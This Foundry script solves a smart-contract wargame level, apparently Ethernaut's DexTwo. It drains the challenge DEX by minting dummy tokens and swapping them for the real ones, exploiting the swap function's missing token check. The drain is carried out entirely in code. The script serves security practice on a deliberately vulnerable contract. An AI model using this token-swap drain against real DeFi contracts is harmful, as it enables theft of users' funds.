// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {DexTwo, SwappableTokenTwo} from "src/L23Dex2.sol";

// 0xe8A9EC3C730f0911e52462b915A516254272Aa16
/**
 * @notice - This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.
 *
 * You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.
 *
 * You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.
 */

/**
 * @notice - DexTwo swap function doesn't check for valid token. You can exploit this to drain the contract of all tokens.
 */
contract L23Dex2Attack is Script, Broadcast {
    // Replace this address with your instance address
    address constant instanceAddress = 0xe8A9EC3C730f0911e52462b915A516254272Aa16;
    address constant myAddress = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    DexTwo dex = DexTwo(instanceAddress);

    function run() public broadcast {
        // Create 2 dummy tokens
        SwappableTokenTwo tokenA = new SwappableTokenTwo(address(dex), "Token 1", "T1", 200);
        SwappableTokenTwo tokenB = new SwappableTokenTwo(address(dex), "Token 2", "T2", 200);

        // Approve dex to spend token1 and token2
        dex.approve(address(dex), type(uint256).max);

        // Approve dex to spend dummy tokens tokenA and tokenB
        tokenA.approve(address(dex), type(uint256).max);
        tokenB.approve(address(dex), type(uint256).max);

        // Transfer dummy tokens into the dex pool
        tokenA.transfer(address(dex), 100);
        tokenB.transfer(address(dex), 100);

        // Swap token1 and token2 with dummy tokens
        dex.swap(address(tokenA), address(dex.token1()), 100);
        dex.swap(address(tokenB), address(dex.token2()), 100);
        _logBalance();
    }

    function _logBalance() internal view {
        console.log("Dex Token 1 balance", dex.balanceOf(dex.token1(), address(dex)));
        console.log("Dex Token 2 balance", dex.balanceOf(dex.token2(), address(dex)));
    }
}
